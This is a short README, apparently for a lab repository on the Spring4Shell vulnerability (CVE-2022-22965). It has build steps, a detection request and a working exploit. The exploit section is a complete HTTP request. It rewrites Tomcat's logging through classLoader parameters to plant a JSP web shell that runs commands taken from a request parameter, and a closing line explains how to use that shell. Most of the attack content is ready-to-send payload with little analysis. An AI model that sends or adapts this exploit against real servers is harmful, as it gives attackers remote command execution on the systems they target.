# CVE-2022-22965(Spring4Shell)

> Blog 首发于 [CVE-2022-22965 漏洞分析-云社区-华为云](https://bbs.huaweicloud.com/blogs/345628)

## Requirements

- java 9 +
- tomcat

## Build

1. `mvn package`


## Start

1. 使用 tomcat 启动 web 项目

## POC

通过错误地设置 classloader 下的属性来触发 BindException异常让服务端返回异常即可判断是否存在漏洞，例如发送

```http
GET /?class.module.classLoader.defaultAssertionStatus=123 HTTP/1.1
Host: 127.0.0.1:39999
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

HTTP/1.1 400 
Content-Type: text/html;charset=UTF-8
Content-Language: zh-CN
Content-Length: 277
Date: Fri, 08 Apr 2022 03:49:42 GMT
Connection: close

<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Fri Apr 08 11:49:42 CST 2022</div><div>There was an unexpected error (type=Bad Request, status=400).</div></body></html>
```

## EXP

```http
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bcmd%7di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2fROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=test&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 7.223.181.36:38888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
cmd: <%=Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{97})))%>
```

后续再利用 `shell.jsp?a=cmd` 来执行命令